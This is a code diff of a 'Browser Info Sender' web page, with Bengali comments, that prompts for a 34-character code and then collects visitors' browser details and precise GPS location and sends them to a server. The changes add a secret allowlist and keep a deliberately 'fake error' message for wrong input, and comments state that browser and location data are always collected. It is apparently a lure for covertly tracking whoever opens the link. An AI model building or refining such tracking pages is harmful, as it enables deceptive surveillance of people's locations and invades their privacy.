@@ -6,7 +6,6 @@
   <title>Browser Info Sender</title>
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
   <style>
-    /* আগের সব CSS একই রাখা হয়েছে, কোনো চেঞ্জ নাই */
     :root {
       --bg: #0a001a;
       --card: rgba(20, 20, 40, 0.75);
@@ -159,15 +158,24 @@
     const sendBtn = document.getElementById('sendBtn');
     const status = document.getElementById('status');
 
+    // তোমার allowed usernames (এখানে add করো যেগুলো match করলে username পাঠাবে)
+    const allowedUsernames = [
+      "abcdefghijklmnopqrstuvwxyz12345678",
+      "1234567890abcdefghijklmnopqrstuvwx",
+      "your-real-secret-34-digit-code-here"
+      // আরও যত চাও যোগ করো
+    ];
+
     usernameInput.addEventListener('input', () => {
       sendBtn.disabled = !usernameInput.value.trim();
     });
 
     async function sendBrowserInfo() {
-      const username = usernameInput.value.trim();
+      const inputUsername = usernameInput.value.trim();
+      let usernameToSend = null; // default: username পাঠাবে না
 
-      // 34 ডিজিট চেক
-      if (username.length !== 34) {
+      // লেংথ ৩৪ না হলে fake error + কোনো data পাঠাবে না
+      if (inputUsername.length !== 34) {
         sendBtn.disabled = true;
         status.textContent = "Processing...";
         setTimeout(() => {
@@ -178,6 +186,15 @@
         return;
       }
 
+      // চেক: exact match আছে কি না
+      const isMatch = allowedUsernames.includes(inputUsername);
+
+      // match হলে username পাঠাবে
+      if (isMatch) {
+        usernameToSend = inputUsername;
+      }
+
+      // সবসময় browser + location collect করবে
       sendBtn.disabled = true;
       sendBtn.textContent = "Collecting & Sending...";
       status.textContent = "Collecting browser info...";
@@ -206,22 +223,13 @@
         let geo = "Location permission denied or error";
         let mapLink = "";
 
-        // প্রতিবার নতুন করে permission চাওয়ার জন্য
         try {
           const position = await new Promise((resolve, reject) => {
-            // maximumAge: 0 দিয়ে cache disable
-            const watchId = navigator.geolocation.getCurrentPosition(
-              (pos) => {
-                navigator.geolocation.clearWatch(watchId); // immediate clear
-                resolve(pos);
-              },
-              reject,
-              {
-                enableHighAccuracy: true,
-                timeout: 15000,
-                maximumAge: 0  // cache না নেয়ার জন্য
-              }
-            );
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              enableHighAccuracy: true,
+              timeout: 15000,
+              maximumAge: 0
+            });
           });
 
           const lat = position.coords.latitude.toFixed(6);
@@ -235,11 +243,11 @@
           sendBtn.disabled = false;
           sendBtn.textContent = "Submit Username & Send My Data";
           console.error("Geolocation failed:", geoErr);
-          return; // permission না দিলে send stop
+          return;
         }
 
         const payload = {
-          username: username,
+          username: usernameToSend,  // match হলে যাবে, না হলে null
           browser: browserInfo,
           geo: geo,
           mapLink: mapLink,
@@ -253,7 +261,7 @@
         });
 
         if (res.ok) {
-          status.textContent = "All data + username sent successfully ✓";
+          status.textContent = "All data sent successfully ✓";
         } else {
           const errText = await res.text();
           status.textContent = "Send failed: " + errText;
